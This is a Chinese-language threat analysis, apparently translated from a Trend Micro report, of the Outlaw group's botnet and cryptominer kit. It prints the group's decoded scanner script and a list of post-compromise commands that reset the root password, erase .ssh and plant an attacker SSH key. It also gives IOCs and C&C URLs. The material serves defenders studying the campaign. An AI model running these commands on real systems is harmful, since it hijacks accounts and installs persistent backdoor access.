**网络犯罪集团保持沉默不一定意味着没有活动，过去几个月一直保持沉默的黑客组织Outlaw更新了其武器库。**

自从去年6月以来该组织一直保持沉默，在12月活动有所增加。研究人员发现该组织对武器功能进行了更新，扩展了扫描程序的参数和目标，改进了规避技术，提高了攻击带来的经济利益。这些工具旨在窃取汽车和金融行业信息，对目标系统发动后续攻击和出售被盗信息。

##  技术分析

新样本利用已知漏洞来针对Linux和Unix操作系统、服务器以及物联网（IoT）设备，新添加了CVE-2016-8655和Dirty
COW漏洞（CVE-2016-5195）利用模块，使用PHP Web
Shell攻击具有SSH和Telnet弱凭据系统。活动中未观察到网络钓鱼或社会工程学攻击，发现了大规模定时IP扫描操作。

流量中的命令异常特征：

![](https://image.3001.net/images/20200422/1587526638_5e9fbbee94ea8.png!small)样本中攻击是从VPS开始的，该服务器搜索存在漏洞的计算机进行入侵，感染后就会启动扫描活动，并传播僵尸网络。攻击者试图利用base-64编码来逃避流量检查。
解码扫描器显示以下代码：

    
    
    #!/bin/bash
    cd /tmp
    rm -rf .ssh
    rm -rf .mountfs
    rm -rf .X13-unix
    rm -rf .X17-unix
    rm -rf .X19-unix
    mkdir .X19-unix
    cd .X19-unix
    mv /var/tmp/dota3.tar.gz dota3.tar.gz
    tar xf dota3.tar.gz
    sleep 3s && cd /tmp/.X19-unix/.rsync/c
    nohup /tmp/.X19-unix/.rsync/c/tsm -t 150 -S 6 -s 6 -p 22 -P 0 -f 0 -k 1 -l 1 -i 0 /tmp/up.txt 192.168 >> /dev/null 2>1&
    sleep 8m && nohup /tmp/.X19-unix/.rsync/c/tsm -t 150 -S 6 -s 6 -p 22 -P 0 -f 0 -k 1 -l 1 -i 0 /tmp/up.txt 172.16 >> /dev/null 2>1&
    sleep 20m && cd ..; /tmp/.X19-unix/.rsync/initall 2>1&
    exit 0

发现的攻击组件为tgz格式，另外还观察到一些伪装为png或jpg的样本。最新版本的代码试图删除以前所有相关的文件和代码，包括自己的代码（以确保更新正在运行的组件）和其他网络罪犯组织的攻击代码，并创建新工作目录‘/tmp/.X19-unix‘放置工具并提取文件。
然后，tsm二进制文件后台运行，将一系列错误消息发送到/dev/null以保持代码运行，等待20分钟后再运行脚本initall：

> 2e2c9d08c7c955f6ce5e27e70b0ec78a888c276d71a72daa0ef9e3e40f019a1a initall

![](https://image.3001.net/images/20200422/1587537799_5e9fe787bdf57.png!small)成功入侵后另一个变体将执行命令，从受感染机器上收集信息（CPU核心数，用户，计划任务，正在运行的进程，已安装的操作系统以及CPU和内存信息），将密码更改为随机字符串存储在/tmp/up.txt中。

    
    
    cat /proc/cpuinfo | grep name | wc -l
    echo "root:TXhf4ICTayIh"|chpasswd|bash
    echo "321" > /var/tmp/.var03522123
    rm -rf /var/tmp/.var03522123
    cat /var/tmp/.var03522123 | head -n 1
    cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
    free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
    ls -lh $(which ls)
    which ls
    crontab -l
    w
    uname -m
    cat /proc/cpuinfo | grep model | grep name | wc -l
    top
    uname
    uname -a
    lscpu | grep Model
    echo "root 123" > /tmp/up.txt
    rm -rf /var/tmp/dota*
    <send Outlaw kit (the archive file) to compromised host via SFTP>
    cat /var/tmp/.systemcache436621
    echo "1" > /var/tmp/.systemcache436621
    cat /var/tmp/.systemcache436621
    sleep 15s && cd /var/tmp; echo "IyEvYmluL2Jhc2gKY2QgL3RtcAk.....<shortened>
    cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3N.....<shortened>

运行后会删除以前攻击的文件和脚本，保持静默从而逃避检测。
如果系统先前已被感染了，它会尝试杀死正在运行的矿工程序及其所有相关活动。最新样本的bashtemp目录中还有其他脚本init和init2：

> 0c458dfe0a2a01ab300c857fdc3373b75fbb8ccfa23d16eff0d6ab888a1a28f6 init

![](https://image.3001.net/images/20200422/1587538119_5e9fe8c723ec3.png!small)

> 93ce211a71867017723cd78969aa4cac9d21c3d8f72c96ee3e1b2712c0eea494 init2

![](https://image.3001.net/images/20200422/1587538148_5e9fe8e439e9a.png!small)

init和init2脚本确保杀死所有其他正在运行的挖矿服务，并授予工作目录777权限确保所有文件都可执行。还发现init0脚本，
该脚本会无差别清除所有矿工。

![](https://image.3001.net/images/20200422/1587538244_5e9fe944aa11c.png!small)恶意软件会重置cron并删除缓存文件，启动脚本和二进制文件init0，修改crontab保持控制权，Shellbot伪装成rsync进程逃避检测。

![](https://image.3001.net/images/20200422/1587538475_5e9fea2ba067f.png!small)

Shellbot脚本在受害者系统重启后运行，脚本/a/upd，/b/sync/和/c/aptitude/会添加到crontab中。
最新版本upd，sync和aptitude功能被禁用。Shellbot通过C＆C服务器发送命令来控制僵尸网络，从受感染系统收集的所有结果和系统信息都将现在本地保存，由攻击者利用C＆C采集信息。

还发现了基于Android Package Kits（APK）和基于Android Debug
Bridge（ADB）的命令，这些命令可在Android系统中启用挖矿活动：

##
![](https://image.3001.net/images/20200422/1587538851_5e9feba39bf09.png!small)总结

2018年发现该组织以来，Outlaw持续使用一套攻击脚本，代码和命令，不同的版本在代码迭代之后会简单的重命名，遵循特定的格式，与代码的实际功能无关。

该组织将公开漏洞利用作为攻击手段，广泛的进行IP地址扫描活动，在特定时期内攻击特定区域。该小组会利用先前攻击活动中的一些细节来最大程度地获利。他们也了解欧洲现有的法律，有意避开攻击某些国家，避免在某些国家被公诉。

公司企业应定期更新系统，关闭未使用端口，保护面向互联网的设备，采用多层安全解决方案，从网关到端点保护系统，并通过行为分析和沙箱阻止恶意URL。

##  IOCs

###
![](https://image.3001.net/images/20200422/1587540167_5e9ff0c7b8dc8.png!small)URLs

> 159[.]203[.]141[.]208
>
> 104[.]236[.]192[.]6
>
> 45[.]9[.]148[.]129:80 Miner pool
>
> 45[.]9[.]148[.]125:80 Miner pool
>
> [http://www](http://www/)[.]minpop[.]com/sk12pack/idents.php Command and
> control
>
> [http://www](http://www/)[.]minpop[.]com/sk12pack/names.php Command and
> control

###  MITRE ATT&CK Matrix™

![](https://image.3001.net/images/20200422/1587540285_5e9ff13dcd017.png!small)***参考来源：[trendmicro](https://blog.trendmicro.com/trendlabs-security-intelligence/outlaw-updates-kit-to-kill-older-miner-versions-targets-more-systems/)，由Kriston编译，转载请注明来自FreeBuf.COM**

  

